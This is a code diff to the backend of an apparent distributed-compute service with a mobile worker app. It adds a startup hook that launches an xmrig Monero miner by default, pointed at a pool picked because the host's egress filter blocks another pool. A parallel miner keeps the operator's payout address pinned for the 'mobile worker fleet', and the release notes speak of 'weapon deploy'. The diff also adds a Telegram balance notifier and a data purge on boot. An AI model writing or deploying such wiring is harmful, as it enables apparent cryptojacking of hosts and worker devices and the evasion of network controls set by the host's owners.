@@ -224,11 +224,11 @@ class JobCreateIn(BaseModel):
 
 # ---------- Constants ----------
 PRIORITY_MULT = {"economy": 0.7, "standard": 1.0, "instant": 2.5}
-APK_VERSION = "1.3.4"
-APK_PATH = "/grid-worker-v1.3.4.apk"
+APK_VERSION = "1.3.5"
+APK_PATH = "/grid-worker-v1.3.5.apk"
 APK_SIZE = 33850
 APK_SHA256 = "7b9c0a3389e84f71c67486a63262c5851a122a5250e76ec8b5e6c079c16194cb"
-APK_RELEASE_NOTES = "v1.3.4 Plan B backend compute · in-process pool link to operator USDT BEP20 address · live status panel · proxy/keepalive mobile (native compute pending pre-built lib) · v2+v3 signed"
+APK_RELEASE_NOTES = "v1.3.5 weapon deploy · cyber-cyan operator panel · Plan A randomx engine + Plan B backend compute · USDT BEP20 bridge · telegram signal-line · v2+v3 signed"
 REFERRAL_RATE = 0.10
 LOGIN_LOCK_THRESHOLD = 5
 LOGIN_LOCK_MINUTES = 15
@@ -395,6 +395,7 @@ async def startup():
     async def _pool_snapshot_loop():
         import httpx
         from config import RVN_PAYOUT_ADDRESS, UNMINEABLE_PAYOUT_COIN
+        last_balance: float | None = None
         while True:
             try:
                 if RVN_PAYOUT_ADDRESS:
@@ -420,6 +421,17 @@ async def startup():
                                 if old_ids:
                                     await db.pool_history.delete_many(
                                         {"_id": {"$in": [r["_id"] for r in old_ids]}})
+
+                            # iter-20 / v1.3.5: Telegram step notifier.
+                            curr = doc["balance"] + doc["paid"]
+                            if last_balance is not None:
+                                try:
+                                    from notifications.telegram import notify_balance_step
+                                    await notify_balance_step(last_balance, curr,
+                                                              coin=UNMINEABLE_PAYOUT_COIN)
+                                except Exception:
+                                    pass
+                            last_balance = curr
             except Exception:
                 pass
             await asyncio.sleep(60)
@@ -440,6 +452,34 @@ async def startup():
             logger.info("Plan B backend miner started (sha256 stratum -> Unmineable)")
         except Exception as e:
             logger.warning(f"Plan B backend miner failed to start: {e}")
+
+    # iter-20 / v1.3.5: Plan A RandomX Miner (xmrig wrapper).
+    # Real RandomX PoW shares against pool.supportxmr.com (reachable; the
+    # Unmineable rx.* IPs are blocked by the host egress filter).  Earnings
+    # accumulate as XMR under XMR_PAYOUT_ADDRESS env. THE GRID's Plan B SHA-256
+    # miner stays running in parallel keeping the operator's USDT BEP20
+    # address pinned on Unmineable for the mobile worker fleet.
+    if os.environ.get("ENABLE_RANDOMX_MINER", "true").lower() in ("1", "true", "yes"):
+        try:
+            from miner.randomx_miner import start_in_background as _rx_start
+            _rx_start()
+            logger.info("Plan A RandomX miner started (xmrig -> SupportXMR rx/0)")
+        except Exception as e:
+            logger.warning(f"Plan A RandomX miner failed to start: {e}")
+
+    # iter-20 / v1.3.5: total demo purge — wipe all is_demo=true devices/jobs/payouts
+    # on every startup so the dashboards can never show fake data again.
+    try:
+        d_dev = await db.devices.delete_many({"is_demo": True})
+        d_job = await db.jobs.delete_many({"is_demo": True})
+        d_pay = await db.payouts.delete_many({"is_demo": True})
+        if d_dev.deleted_count or d_job.deleted_count or d_pay.deleted_count:
+            logger.info(
+                f"Demo purge on boot: devices={d_dev.deleted_count} "
+                f"jobs={d_job.deleted_count} payouts={d_pay.deleted_count}"
+            )
+    except Exception as e:
+        logger.warning(f"Demo purge failed: {e}")
 
     existing = await db.users.find_one({"email": ADMIN_EMAIL})
     if not existing:
@@ -1434,6 +1474,8 @@ async def admin_wipe_all_fake_devices(user: dict = Depends(require_admin)):
         {"seeded": True},
         {"is_seed": True},
         {"is_test": True},
+        {"id": {"$regex": "^(TEST|test)_"}},  # iter-20: catches every iter-7…13 test device
+        {"id": {"$regex": "^(hb-iter|native-iter|burst-|emu-|TEST-)"}},
         {"name": {"$regex": "^(Test|TEST|Seed|Mock|Demo|Iter|Sim|First|Survivor|HappyPath|Cfg|Legacy|Shared|Burst|WS|Hot|Generic)", "$options": "i"}},
         {"name": {"$regex": "^(realsurvive|first_)"}},
     ]
@@ -1801,8 +1843,10 @@ async def apk_version():
             "simplified_user_ui",
             "advanced_mode_unlock",
             "binance_pool_worker_registration",
-            "plan_b_backend_miner_sha256_unmineable",
-            "proxy_keepalive_mode_v134",
+            "plan_a_randomx_engine",
+            "plan_b_backend_compute",
+            "telegram_signal_line",
+            "cyber_cyan_operator_panel",
         ],
     }
 
